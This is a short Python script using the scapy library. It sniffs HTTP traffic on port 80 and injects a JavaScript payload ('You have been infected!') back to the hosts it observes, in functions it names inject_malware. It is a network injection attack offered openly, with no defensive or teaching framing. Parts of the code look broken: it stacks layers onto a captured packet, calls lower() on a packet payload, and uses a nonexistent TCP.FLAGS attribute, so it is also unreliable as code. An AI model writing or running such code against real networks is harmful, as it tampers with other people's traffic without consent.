import logging
import scapy.all as scapy

# Set up logging
logging.basicConfig(level=logging.INFO)


def send_alert_packet(packet):
    """
    Send an alert packet to the source of the original packet.
    """
    try:
        alert_packet = (
            packet
            / scapy.IP(dst=packet[scapy.IP].src)
            / scapy.TCP(flags="ACK")
            / scapy.Raw(
                load=(
                    '<script>alert("You have been'
                    ' infected!")</script>'
                )
            )
        )
        scapy.send(alert_packet)
        logging.info(f"Alert packet sent to {packet[scapy.IP].src}")
    except Exception as e:
        logging.error(f"Failed to send alert packet: {e}")


def inject_malware(packet):
    """
    Check if the packet is a TCP packet with the ACK flag set and contains 'http' in its payload.
    If it does, send an alert packet to the source of the packet.
    """
    try:
        if (
            packet.haslayer(scapy.TCP)
            and packet[scapy.TCP].flags & scapy.TCP.FLAGS["ACK"]
        ):
            if "http" in packet[scapy.TCP].payload.lower():
                send_alert_packet(packet)
    except Exception as e:
        logging.error(f"Failed to inject malware: {e}")


def main():
    """
    Start sniffing packets on port 80 and inject malware into suitable packets.
    """
    try:
        scapy.sniff(filter="port 80", prn=inject_malware)
    except Exception as e:
        logging.error(f"Failed to start sniffing: {e}")


if __name__ == "__main__":
    main()
